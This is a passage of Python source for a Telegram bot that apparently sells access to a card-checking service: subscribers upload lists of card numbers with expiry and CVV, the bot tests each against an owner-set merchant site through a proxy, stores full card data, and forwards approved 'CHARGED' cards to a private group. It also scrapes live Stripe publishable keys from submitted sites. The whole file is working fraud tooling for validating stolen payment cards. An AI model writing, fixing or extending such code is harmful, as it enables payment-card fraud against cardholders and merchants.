        except Exception:
            failed += 1
        await asyncio.sleep(0.05)
    await update.message.reply_text(f"📣 Broadcast sent\n✅ {sent} · ❌ {failed}")

@admin_only
async def cmd_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    with db() as c:
        total = c.execute("SELECT COUNT(*) AS n FROM users").fetchone()["n"]
        active = c.execute("SELECT COUNT(*) AS n FROM users WHERE expiry_ts > ? AND banned=0",
                           (now_ts(),)).fetchone()["n"]
        banned = c.execute("SELECT COUNT(*) AS n FROM users WHERE banned=1").fetchone()["n"]
        latest = c.execute("SELECT * FROM users ORDER BY first_seen DESC LIMIT 25").fetchall()
    body = "\n".join(fmt_user(r) for r in latest) if latest else "—"
    await update.message.reply_text(
        f"╭─ 👥  <b>USER STATS</b>\n"
        f"│\n"
        f"├ 📊 Total: <b>{total}</b>\n"
        f"├ 💎 Active: <b>{active}</b>\n"
        f"├ 🚫 Banned: <b>{banned}</b>\n"
        f"╰\n\n"
        f"🕒 <b>Latest 25</b>\n{body}",
        parse_mode=ParseMode.HTML,
    )

@admin_only
async def cmd_ban(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    args = ctx.args or []
    if not args:
        await update.message.reply_text(
            "🚫 Usage: <code>/ban &lt;user_id&gt; [reason]</code>",
            parse_mode=ParseMode.HTML)
        return
    try:
        uid = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user id."); return
    if uid == OWNER_ID:
        await update.message.reply_text("👑 Cannot ban owner."); return
    if user_is_admin(uid) and update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🛠 Cannot ban admin (owner only)."); return
    user_ensure(uid)
    reason = " ".join(args[1:]) if len(args) > 1 else ""
    ok = user_ban(uid, reason)
    if not ok:
        await update.message.reply_text("❌ User not found in DB."); return
    await update.message.reply_text(
        f"🚫 Banned <code>{uid}</code>\n💬 Reason: <i>{html.escape(reason) or '—'}</i>",
        parse_mode=ParseMode.HTML)

@admin_only
async def cmd_unban(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    args = ctx.args or []
    if not args:
        await update.message.reply_text("✅ Usage: <code>/unban &lt;user_id&gt;</code>",
                                        parse_mode=ParseMode.HTML)
        return
    try:
        uid = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user id."); return
    user_ensure(uid)
    user_unban(uid)
    await update.message.reply_text(f"✅ Unbanned <code>{uid}</code>", parse_mode=ParseMode.HTML)

@admin_only
async def cmd_revoke(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    args = ctx.args or []
    if not args:
        await update.message.reply_text("♻️ Usage: <code>/revoke &lt;user_id&gt;</code>",
                                        parse_mode=ParseMode.HTML)
        return
    try:
        uid = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user id."); return
    if uid == OWNER_ID:
        await update.message.reply_text("👑 Cannot revoke owner."); return
    ok = user_revoke(uid)
    if not ok:
        await update.message.reply_text("❌ User not found."); return
    await update.message.reply_text(
        f"♻️ Plan revoked for <code>{uid}</code>\nAccess removed.",
        parse_mode=ParseMode.HTML)

@admin_only
async def cmd_banned_list(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    with db() as c:
        rows = c.execute("SELECT * FROM users WHERE banned=1 ORDER BY first_seen DESC").fetchall()
    if not rows:
        await update.message.reply_text("✅ No banned users.")
        return
    body = "\n".join(
        f"<code>{r['user_id']}</code> — @{r['username'] or '—'} — <i>{html.escape(r['ban_reason'] or '—')}</i>"
        for r in rows
    )
    await update.message.reply_text(f"🚫 <b>Banned users</b>\n\n{body}", parse_mode=ParseMode.HTML)

# ===================== OWNER COMMANDS =====================
@owner_only
async def cmd_addadmin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("➕ Usage: <code>/addadmin &lt;user_id&gt;</code>",
                                        parse_mode=ParseMode.HTML)
        return
    try:
        uid = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid id."); return
    user_ensure(uid)
    with db() as c:
        c.execute("INSERT INTO admins(user_id, added_by, added_at) VALUES(?,?,?) "
                  "ON CONFLICT(user_id) DO NOTHING", (uid, update.effective_user.id, now_ts()))
    await update.message.reply_text(f"👑 Added admin: <code>{uid}</code>", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_deladmin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("➖ Usage: <code>/deladmin &lt;user_id&gt;</code>",
                                        parse_mode=ParseMode.HTML)
        return
    try:
        uid = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid id."); return
    with db() as c:
        c.execute("DELETE FROM admins WHERE user_id=?", (uid,))
    await update.message.reply_text(f"➖ Removed admin: <code>{uid}</code>", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_setgc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("📥 Usage: <code>/setgc -1001234567890</code>",
                                        parse_mode=ParseMode.HTML)
        return
    gid = ctx.args[0].strip()
    cfg_set("gc_id", gid)
    await update.message.reply_text(f"✅ Charged GC set to <code>{gid}</code>",
                                    parse_mode=ParseMode.HTML)

@owner_only
async def cmd_getgc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    gid = cfg_get("gc_id", "not set")
    await update.message.reply_text(f"👁 Charged GC: <code>{gid}</code>", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_setsite(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("🌐 Usage: <code>/setsite domain.com[,domain2]</code>",
                                        parse_mode=ParseMode.HTML)
        return
    cfg_set("working_sites", ",".join(ctx.args).replace("https://", "").replace("http://", ""))
    await update.message.reply_text("✅ Target site(s) updated.", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_setproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        cfg_set("proxy", "")
        await update.message.reply_text("🧦 Proxy cleared."); return
    cfg_set("proxy", ctx.args[0])
    await update.message.reply_text("✅ Proxy set.", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_charges(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    n = 20
    if ctx.args:
        try: n = min(int(ctx.args[0]), 50)
        except Exception: pass
    with db() as c:
        rows = c.execute("SELECT * FROM charges ORDER BY ts DESC LIMIT ?", (n,)).fetchall()
    if not rows:
        await update.message.reply_text("💾 No charges yet."); return
    lines = ["💾 <b>Recent charges</b>\n"]
    for r in rows:
        ts = datetime.fromtimestamp(r["ts"], tz=timezone.utc).strftime("%m-%d %H:%M")
        lines.append(f"💳 <code>{r['card']}</code>\n"
                     f"   📩 {html.escape(r['response'])}\n"
                     f"   👤 <code>{r['user_id']}</code> · {ts}")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

# ===================== GC FORWARD =====================
async def forward_to_gc(bot, user, card: str, response: str, site: str):
    gid = cfg_get("gc_id", "")
    if not gid:
        return
    try:
        chat_id = int(gid)
    except ValueError:
        return
    txt = (
        f"💥 <b>CHARGED</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💳 <code>{card}</code>\n"
        f"🌐 <code>{site}</code>\n"
        f"📩 {html.escape(response)}\n"
        f"👤 <code>{user.id}</code> — @{user.username or '—'}"
    )
    try:
        await bot.send_message(chat_id, txt, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.warning(f"GC forward failed: {e}")

# ===================== CALLBACKS =====================
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    data = q.data or ""
    st = get_state(u.id)

    if data == "menu:home":
        await q.answer()
        try:
            await q.edit_message_text(
                f"🏠 <b>{BOT_NAME}</b>\nMain menu.",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu(is_admin=user_is_admin(u.id),
                                       is_owner=u.id == OWNER_ID))
        except Exception:
            pass
        return

    if data == "u:me":
        await q.answer(); await cmd_me(update, ctx); return
    if data == "u:help":
        await q.answer(); await cmd_help(update, ctx); return
    if data == "u:single_hint":
        await q.answer()
        await q.message.reply_text("💳 <code>/st 4111111111111111|12|25|123</code>",
                                   parse_mode=ParseMode.HTML); return
    if data == "u:bulk_hint":
        await q.answer(); await cmd_mass(update, ctx); return
    if data == "u:redeem_hint":
        await q.answer()
        await q.message.reply_text("🔑 <code>/redeem OGGY-PROO-XXXX</code>",
                                   parse_mode=ParseMode.HTML); return
    if data == "u:key_hint":
        await q.answer()
        await q.message.reply_text("🌐 <code>/key 5</code>", parse_mode=ParseMode.HTML); return

    # mass
    if data == "m:start":
        await q.answer(); await _start_mass(u.id, q); return
    if data == "m:clear":
        await q.answer()
        st["pending_cards"] = []
        try: await q.edit_message_text("🗑 Cleared.")
        except Exception: pass
        return
    if data == "m:stop":
        await q.answer("🛑 Stopping…")
        st["mass_running"] = False
        return

    # admin panel
    if data == "a:panel":
        if not user_is_admin(u.id):
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer(); await cmd_admin(update, ctx); return
    if data == "a:genkeys":
        if not user_is_admin(u.id):
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer()
        await q.message.reply_text("🔑 <code>/genkey &lt;count&gt; &lt;duration&gt;</code>\n"
                                   "📌 <code>/genkey 10 30d</code>",
                                   parse_mode=ParseMode.HTML); return
    if data == "a:broadcast":
        if not user_is_admin(u.id):
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer()
        await q.message.reply_text("📣 <code>/broadcast your message</code>",
                                   parse_mode=ParseMode.HTML); return
    if data == "a:users":
        if not user_is_admin(u.id):
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer(); await cmd_users(update, ctx); return
    if data == "a:banned":
        if not user_is_admin(u.id):
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer(); await cmd_banned_list(update, ctx); return
    if data == "a:stats":
        if not user_is_admin(u.id):
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer()
        with db() as c:
            tu = c.execute("SELECT COUNT(*) AS n FROM users").fetchone()["n"]
            au = c.execute("SELECT COUNT(*) AS n FROM users WHERE expiry_ts > ? AND banned=0",
                           (now_ts(),)).fetchone()["n"]
            bu = c.execute("SELECT COUNT(*) AS n FROM users WHERE banned=1").fetchone()["n"]
            tc = c.execute("SELECT COUNT(*) AS n FROM charges").fetchone()["n"]
            ap = c.execute("SELECT COUNT(*) AS n FROM charges WHERE response='Card Added'").fetchone()["n"]
            kt = c.execute("SELECT COUNT(*) AS n FROM keys").fetchone()["n"]
            ku = c.execute("SELECT COUNT(*) AS n FROM keys WHERE used_by IS NOT NULL").fetchone()["n"]
        txt = (
            f"╭─ 📊  <b>STATS</b>\n"
            f"│\n"
            f"├ 👥 Users: <b>{tu}</b>\n"
            f"├ 💎 Active: <b>{au}</b>\n"
            f"├ 🚫 Banned: <b>{bu}</b>\n"
            f"├ 🔑 Keys: <b>{kt}</b> (used {ku})\n"
            f"├ 🔍 Checks: <b>{tc}</b>\n"
            f"╰ ✅ Approved: <b>{ap}</b>"
        )
        try:
            await q.edit_message_text(txt, parse_mode=ParseMode.HTML,
                                      reply_markup=admin_panel_kb(is_owner=u.id == OWNER_ID))
        except Exception:
            pass
        return
    if data == "a:unused":
        if not user_is_admin(u.id):
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer()
        with db() as c:
            rows = c.execute("SELECT key, duration_s FROM keys WHERE used_by IS NULL "
                             "ORDER BY created_at DESC LIMIT 50").fetchall()
        if not rows:
            await q.message.reply_text("🗝 No unused keys."); return
        body = "\n".join(f"<code>{r['key']}</code> — {fmt_duration(r['duration_s'])}" for r in rows)
        await q.message.reply_text(f"🗝 <b>Unused keys</b>\n\n{body}", parse_mode=ParseMode.HTML)
        return

    # owner panel
    if data == "o:admins":
        if u.id != OWNER_ID:
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer()
        try:
            await q.edit_message_text("👑 <b>Admin Management</b>", parse_mode=ParseMode.HTML,
                                      reply_markup=admin_mgmt_kb())
        except Exception: pass
        return
    if data == "o:addadmin":
        if u.id != OWNER_ID:
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer()
        await q.message.reply_text("➕ <code>/addadmin &lt;user_id&gt;</code>",
                                   parse_mode=ParseMode.HTML); return
    if data == "o:deladmin":
        if u.id != OWNER_ID:
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer()
        await q.message.reply_text("➖ <code>/deladmin &lt;user_id&gt;</code>",
                                   parse_mode=ParseMode.HTML); return
    if data == "o:listadmins":
        if u.id != OWNER_ID:
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer()
        with db() as c:
            rows = c.execute("SELECT * FROM admins").fetchall()
        if not rows:
            await q.message.reply_text("No admins."); return
        body = "\n".join(f"🛠 <code>{r['user_id']}</code>" for r in rows)
        await q.message.reply_text(f"👑 <b>Admins</b>\n{body}", parse_mode=ParseMode.HTML)
        return
    if data == "o:setgc":
        if u.id != OWNER_ID:
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer()
        await q.message.reply_text("📥 <code>/setgc -1001234567890</code>",
                                   parse_mode=ParseMode.HTML); return
    if data == "o:getgc":
        if u.id != OWNER_ID:
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer()
        gid = cfg_get("gc_id", "not set")
        await q.message.reply_text(f"👁 Charged GC: <code>{gid}</code>", parse_mode=ParseMode.HTML)
        return
    if data == "o:charges":
        if u.id != OWNER_ID:
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer(); await cmd_charges(update, ctx); return
    if data == "o:site_hint":
        if u.id != OWNER_ID:
            await q.answer("🚫 Denied.", show_alert=True); return
        await q.answer()
        await q.message.reply_text("🌐 <code>/setsite domain.com</code>",
                                   parse_mode=ParseMode.HTML); return

    await q.answer()

# ===================== MASS FLOW =====================
async def _start_mass(uid: int, q):
    st = get_state(uid)
    cards = st.get("pending_cards") or []
    if not cards:
        await q.answer("No cards loaded.", show_alert=True); return
    if user_is_banned(uid):
        await q.answer("🚫 Banned.", show_alert=True); return
    if not user_has_plan(uid):
        await q.answer("No active plan.", show_alert=True); return

    site = (cfg_get("working_sites", "") or "").split(",")[0].strip()
    if not site:
        await q.answer("No site configured.", show_alert=True); return
    proxy_str = cfg_get("proxy", "")
    proxy_dict = parse_proxy_format(proxy_str) if proxy_str else None

    st.update({
        "mass_running": True,
        "mass_chat_id": q.message.chat_id,
        "mass_msg_id": q.message.message_id,
        "mass_done": 0, "mass_total": len(cards),
        "mass_approved": 0, "mass_declined": 0, "mass_threed": 0,
    })
    try:
        await q.edit_message_text(
            f"⚡ <b>Running</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📊 0/{len(cards)}",
            parse_mode=ParseMode.HTML,
            reply_markup=running_kb(),
        )
    except Exception:
        pass

    asyncio.create_task(_mass_worker(uid, cards, site, proxy_dict))

async def _mass_worker(uid: int, cards: list, site: str, proxy_dict):
    st = get_state(uid)
    chat_id, msg_id = st["mass_chat_id"], st["mass_msg_id"]
    loop = asyncio.get_event_loop()
    last_edit = 0.0
    bot = BOT_APP.bot

    user_row = user_get(uid)
    class _U:
        id = uid
        username = user_row["username"] if user_row else ""
    u_shim = _U()

    for card in cards:
        if not st.get("mass_running"):
            break
        card = card.strip()
        if not card:
            continue
        try:
            res = await loop.run_in_executor(None, process_card_enhanced, site, card, proxy_dict)
        except Exception as e:
            res = {"Response": str(e), "Status": "Declined"}
        status = res.get("Status", "?")
        resp = res.get("Response", "?")

        with db() as c:
            c.execute("UPDATE users SET total_checks=total_checks+1 WHERE user_id=?", (uid,))
            c.execute("INSERT INTO charges(user_id, card, response, ts) VALUES(?,?,?,?)",
                      (uid, card, resp, now_ts()))

        if status == "Approved":
            st["mass_approved"] += 1
            await forward_to_gc(bot, u_shim, card, resp, site)
        elif "3d" in resp.lower() or "secure" in resp.lower():
            st["mass_threed"] += 1
        else:
            st["mass_declined"] += 1
        st["mass_done"] += 1

        now = time.time()
        if now - last_edit > 2 or st["mass_done"] == st["mass_total"]:
            last_edit = now
            try:
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id,
                    text=(f"⚡ <b>Running</b>\n"
                          f"━━━━━━━━━━━━━━━\n"
                          f"📊 {st['mass_done']}/{st['mass_total']}\n"
                          f"✅ {st['mass_approved']} · 🔐 {st['mass_threed']} · ❌ {st['mass_declined']}"),
                    parse_mode=ParseMode.HTML,
                    reply_markup=running_kb(),
                )
            except Exception:
                pass

    st["mass_running"] = False
    try:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text=(f"🏁 <b>Finished</b>\n"
                  f"━━━━━━━━━━━━━━━\n"
                  f"📊 {st['mass_done']}/{st['mass_total']}\n"
                  f"✅ {st['mass_approved']} · 🔐 {st['mass_threed']} · ❌ {st['mass_declined']}"),
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass

# ===================== TEXT / DOCUMENT =====================
async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    doc = update.message.document
    if not doc or not doc.file_name.lower().endswith(".txt"):
        return
    if user_is_banned(u.id):
        await update.message.reply_text("🚫 You are banned."); return
    if not user_has_plan(u.id):
        await update.message.reply_text("🚫 No active plan. Use <code>/redeem</code>.",
                                        parse_mode=ParseMode.HTML); return
    try:
        f = await ctx.bot.get_file(doc.file_id)
        content = await f.download_as_bytearray()
        text = content.decode("utf-8", errors="ignore")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to read: {e}"); return
    cards = parse_cards_from_text(text)
    if not cards:
        await update.message.reply_text("⚠️ No valid cards in file."); return
    st = get_state(u.id)
    st["pending_cards"] = cards
    await update.message.reply_text(
        f"📄 Loaded <b>{len(cards)}</b> cards from <code>{html.escape(doc.file_name)}</code>\n\n"
        f"Tap <b>START</b> to begin.",
        parse_mode=ParseMode.HTML,
        reply_markup=start_button_kb(len(cards)),
    )

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    text = update.message.text or ""
    st = get_state(u.id)

    if st.get("pending") == "awaiting_sites_for_key":
        st["pending"] = None
        n = st.get("pending_key_count") or 5
        sites = [s.strip().replace("https://", "").replace("http://", "").split("/")[0]
                 for s in text.splitlines() if s.strip()][:n]
        if not sites:
            await update.message.reply_text("⚠️ No valid sites."); return
        msg = await update.message.reply_text(f"🌐 Extracting from {len(sites)} sites…")
        loop = asyncio.get_event_loop()
        found = []
        for s in sites:
            key = await loop.run_in_executor(None, get_stripe_key, s, None)
            if key:
                found.append((s, key))
        if not found:
            await msg.edit_text("❌ No pk_live keys found."); return
        body = "\n".join(f"🔑 <code>{k}</code>\n    🌐 {html.escape(s)}" for s, k in found)
        await msg.edit_text(f"<b>🔑 {len(found)} keys found</b>\n\n{body}",
                            parse_mode=ParseMode.HTML)
        return

    cards = parse_cards_from_text(text)
    if cards:
        if user_is_banned(u.id):
            await update.message.reply_text("🚫 You are banned."); return
        if not user_has_plan(u.id):
            await update.message.reply_text("🚫 No active plan. Use <code>/redeem</code>.",
                                            parse_mode=ParseMode.HTML); return
        st["pending_cards"] = cards
        await update.message.reply_text(
            f"💳 Detected <b>{len(cards)}</b> cards\n\n"
            f"Tap <b>START</b> to begin.",
            parse_mode=ParseMode.HTML,
            reply_markup=start_button_kb(len(cards)),
        )
        return

    await update.message.reply_text("❓ Unknown input. Try /help.", reply_markup=back_main_kb())

# ===================== BOOT =====================
BOT_APP: Application = None

def main():
    global BOT_APP
    init_db()
    BOT_APP = Application.builder().token(BOT_TOKEN).build()

    # banned guard — runs before everything
    BOT_APP.add_handler(MessageHandler(filters.ALL, banned_guard), group=-1)
    BOT_APP.add_handler(CallbackQueryHandler(banned_guard), group=-1)

    # user
    BOT_APP.add_handler(CommandHandler("start", cmd_start))
    BOT_APP.add_handler(CommandHandler("help", cmd_help))
    BOT_APP.add_handler(CommandHandler("me", cmd_me))
    BOT_APP.add_handler(CommandHandler("redeem", cmd_redeem))
    BOT_APP.add_handler(CommandHandler("st", cmd_single))
    BOT_APP.add_handler(CommandHandler("mass", cmd_mass))
    BOT_APP.add_handler(CommandHandler("key", cmd_key))

    # admin
    BOT_APP.add_handler(CommandHandler("admin", cmd_admin))
    BOT_APP.add_handler(CommandHandler("genkey", cmd_genkey))
    BOT_APP.add_handler(CommandHandler("broadcast", cmd_broadcast))
    BOT_APP.add_handler(CommandHandler("users", cmd_users))
    BOT_APP.add_handler(CommandHandler("ban", cmd_ban))
    BOT_APP.add_handler(CommandHandler("unban", cmd_unban))
    BOT_APP.add_handler(CommandHandler("revoke", cmd_revoke))
    BOT_APP.add_handler(CommandHandler("banned", cmd_banned_list))

    # owner
    BOT_APP.add_handler(CommandHandler("addadmin", cmd_addadmin))
    BOT_APP.add_handler(CommandHandler("deladmin", cmd_deladmin))
    BOT_APP.add_handler(CommandHandler("setgc", cmd_setgc))
    BOT_APP.add_handler(CommandHandler("getgc", cmd_getgc))
    BOT_APP.add_handler(CommandHandler("setsite", cmd_setsite))
    BOT_APP.add_handler(CommandHandler("setproxy", cmd_setproxy))
    BOT_APP.add_handler(CommandHandler("charges", cmd_charges))

    # interactive
    BOT_APP.add_handler(CallbackQueryHandler(on_callback))
    BOT_APP.add_handler(MessageHandler(filters.Document.TXT, on_document))
    BOT_APP.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    print(f"🤖 {BOT_NAME} starting…")
    BOT_APP.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()